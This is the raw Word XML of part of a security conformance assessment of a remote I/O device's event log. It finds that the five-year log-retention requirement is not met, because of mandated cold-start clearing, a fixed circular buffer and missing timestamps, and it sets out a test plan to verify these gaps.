              <w:r w:rsidRPr="00E57282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E57282" w:rsidRPr="00E57282" w14:paraId="0FA5C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B1033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rFonts w:ascii="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>⚠</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>"Survives non-cold-start resets"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936B0" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282"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3E6B1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  <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Precision check retained:</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> docs state cold start clears the log and resets uptime (SRIO-15398); they do </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>not</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> positively document warm-reset survival → state as a </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>hypothesis to verify</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (TS-2), not asserted. </w:t>
            </w:r>
            <w:hyperlink r:id="rId304" w:history="1">
              <w:r w:rsidRPr="00E57282">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00E57282">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00E57282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6591F31A" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Gaps (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>retention-scoped</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B28169F" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-1 (Deletion — confirmed; structural).</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Cold start clears the log (SRIO-6521). Crucially, the device's </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>own mandatory ≤1-year reboot interval (SRIO-1812)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — required to test watchdog/safety functions untestable at runtime — </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>forces an annual cold start</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, so the log is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>guaranteed to be wiped at least once per year by the device's own safety-maintenance requirement</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. The 5-year window is therefore </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>structurally impossible</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, independent of any attack.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(The firmware-</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>install</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> reboot is an additional clearing event → cross-reference RQ-008 G-3.)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId305" w:history="1">
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3BF89400" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-2 (Capacity — confirmed; compounded).</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> A </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fixed ≥100-entry circular buffer</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SRIO-10663) with </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no timestamp</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (no RTC; SRIO-15218/15398) means that over 5 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">years even a modest event rate overflows the buffer, </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the surviving 100 entries </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cannot be bounded to a 5-year window</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> because they are </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>undatable</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. The capacity conflict compounds with a </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>time-attribution conflict</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the retained fragment is both </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>incomplete and undatable</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId306" w:history="1">
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4A528D5B" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-3 (incomplete retained scope — reframed as cross-reference).</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Even ignoring deletion/capacity, the retained data is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>incomplete</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: the log captures </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>software/error events only</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no physical-intervention events (RQ-003)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, and only partial config/software markers (RQ-008/009). So the retained fragment cannot represent "</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>any</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> intervention."</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(This is a collection-completeness limitation owned by RQ-003/008/009; RQ-012 notes it as a cross-reference bearing on what there is to retain.)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId307" w:history="1">
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5C05AF3A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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SL/conformance conclusion:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-012 is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>definitively NOT met.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>accessibility</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> limb (CR 6.1) is satisfied — a log exists and is IoT-readable — but </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>every retention property fails</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>: (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>annual cold-start clearing is mandated by the device's own reboot-interval safety requirement</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (G-1, structural), (ii) the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fixed circular buffer overflows and overwrites</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (G-2), and (iii) there is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no absolute timestamp to bound a 5-year window</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (G-2 compound). Uniquely, this non-conformity </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cannot be rescued by the environmental "safe-zone" assumption</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — retention is an </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>intrinsic device property</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, not a network-boundary one.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(Version-history retention → RQ-013; access restriction → RQ-014; install-reboot self-erasing → RQ-008; collection completeness → RQ-003/008/009.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="612035BC" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:pict w14:anchorId="291AB56B">
          <v:rect id="_x0000_i1817" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BBA5C31" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 2 — Methodological Test Planning (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="276F970C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A </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>conformance-disproof</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirement: demonstrate the deletion and capacity conflicts empirically, and clarify the (undocumented) warm-reset </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>behaviour</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282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3894"/>
        <w:gridCol w:w="2034"/>
        <w:gridCol w:w="2187"/>
        <w:gridCol w:w="628"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="002CEF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0279A1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010043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73DE09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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282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19D4FC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 xml:space="preserve">Scientific </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282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0CBFF5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SVV</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="71C52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B1DFE" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282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A8D43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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Capacity/overflow</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">: generate &gt;100 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>loggable</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> events; confirm oldest entries overwritten (fixed buffer, no growth)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A3275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Proves</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> G-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>capacity</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>conflict</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282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E9ABB" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t>NIST SP 800-115 §3.2 (log review); OWASP ISTG-DES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2C4CF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SVV-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="30CFA0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EE040" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282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DD164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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Reset-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>behaviour</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> matrix</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">: populate the log, then apply (a) a warm reset and (b) a cold start; confirm cold start clears + clarify warm-reset </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>behaviour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96B083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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Proves G-1</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> + resolves the unverified "warm-reset survival" claim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E5A7E" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t>NIST SP 800-115 §3.2 / §7 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>evidence</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>handling</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282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289DB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SVV-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="7D528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E7700" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282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803FB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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Mandated-reboot retention check</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>: simulate the annual reboot interval (SRIO-1812) and confirm the log does not survive the device's own required maintenance reboot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D8AE1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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Proves G-1 is structural</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (device's safety requirement forces deletion)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59349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t>Requirements-based</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>documentation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> review (SRIO-1812)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01E2C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SVV-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="02B00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6563F" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282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79E4F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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Time-attribution</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>: confirm no absolute timestamp on any retained entry, so a 5-year window cannot be bounded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0F3FF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Proves</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> G-2 compound</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>undatable</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282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D596D" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>NIST SP 800-115 §3.2 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
